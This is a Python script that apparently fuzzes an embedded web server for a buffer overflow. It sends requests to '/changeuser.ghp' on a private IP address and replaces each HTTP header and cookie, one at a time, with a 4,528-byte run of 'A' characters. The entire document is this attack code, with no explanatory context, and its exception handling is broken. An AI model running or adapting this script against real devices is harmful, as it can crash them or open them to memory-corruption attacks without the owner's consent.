import requests, copy

host = "http://172.30.1.8"
uri = "/changeuser.ghp"

org_headers = {
    "User-Agent" : "Mozilla/4.0",
    "Host" : host.split("://")[1],
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language" : "en-us",
    "Accept-Encoding" : "gzip, deflate",
    "Referer": host,
    "Conection": "Keep-Alive"
}

org_cookies = {
    "SESSIONID":"6771",
    "UserID":"id",
    "PassWD":"password"
}

payload = "A" * 4528

for key in list(org_headers.keys()):
    print("Header",key, end=": ")
    try:
        headers = copy.deepcopy(org_headers)
        headers[key] = payload
        res = requests.get(host + uri, headers=headers, cookies=org_cookies)
        print(": Good!")
    except Exception as e:
        print(e[:10])
        
for key in list(org_cookies.keys()):
    print("Cookie",key, end=": ")
    try:
        cookies = copy.deepcopy(org_cookies)
        cookies[key] = payload
        res = requests.get(host + uri, headers=org_headers, cookies=cookies)
        print(": Good!")
    except Exception as e:
        print(e[:10])
    
